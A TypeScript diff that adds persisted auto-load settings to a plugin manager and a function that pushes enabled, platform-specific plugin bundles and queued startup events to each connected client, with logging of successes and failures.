@@ -9,18 +9,22 @@ import { encodeMessage, type PluginManifest } from "../protocol";
 export type PluginState = {
   enabled: Record<string, boolean>;
   lastError: Record<string, string>;
+  autoLoad: Record<string, boolean>;
+  autoStartEvents: Record<string, Array<{ event: string; payload: any }>>;
 };
 
 export async function loadPluginStateFromDisk(pluginStatePath: string): Promise<PluginState> {
   try {
     const raw = await fs.readFile(pluginStatePath, "utf-8");
-    const parsed = JSON.parse(raw) as { enabled?: Record<string, boolean>; lastError?: Record<string, string> };
+    const parsed = JSON.parse(raw) as Partial<PluginState>;
     return {
       enabled: parsed.enabled || {},
       lastError: parsed.lastError || {},
+      autoLoad: parsed.autoLoad || {},
+      autoStartEvents: parsed.autoStartEvents || {},
     };
   } catch {
-    return { enabled: {}, lastError: {} };
+    return { enabled: {}, lastError: {}, autoLoad: {}, autoStartEvents: {} };
   }
 }
 
@@ -267,6 +271,43 @@ export function sendPluginBundle(
       payload: { pluginId: bundle.manifest.id },
     }),
   );
+}
+
+export async function dispatchAutoLoadPlugins(
+  client: ClientInfo,
+  pluginState: PluginState,
+  isPluginLoaded: (clientId: string, pluginId: string) => boolean,
+  isPluginLoading: (clientId: string, pluginId: string) => boolean,
+  markPluginLoading: (clientId: string, pluginId: string) => void,
+  enqueuePluginEvent: (clientId: string, pluginId: string, event: string, payload: any) => void,
+  loadBundle: (pluginId: string, clientOS?: string, clientArch?: string) => Promise<{ manifest: PluginManifest; binary: Uint8Array | null }>,
+): Promise<void> {
+  const autoLoadIds = Object.entries(pluginState.autoLoad)
+    .filter(([id, enabled]) => enabled && pluginState.enabled[id] !== false)
+    .map(([id]) => id);
+
+  for (const pluginId of autoLoadIds) {
+    if (isPluginLoaded(client.id, pluginId) || isPluginLoading(client.id, pluginId)) {
+      continue;
+    }
+
+    try {
+      const bundle = await loadBundle(pluginId, client.os, client.arch);
+      markPluginLoading(client.id, pluginId);
+      sendPluginBundle(client, bundle);
+
+      const autoEvents = pluginState.autoStartEvents[pluginId];
+      if (autoEvents && autoEvents.length > 0) {
+        for (const evt of autoEvents) {
+          enqueuePluginEvent(client.id, pluginId, evt.event, evt.payload);
+        }
+      }
+
+      logger.info(`[plugin-autoload] dispatched ${pluginId} to ${client.id}`);
+    } catch (err) {
+      logger.warn(`[plugin-autoload] failed to load ${pluginId} for ${client.id}: ${(err as Error).message}`);
+    }
+  }
 }
 
 function derivePlatformKey(filename: string): string {
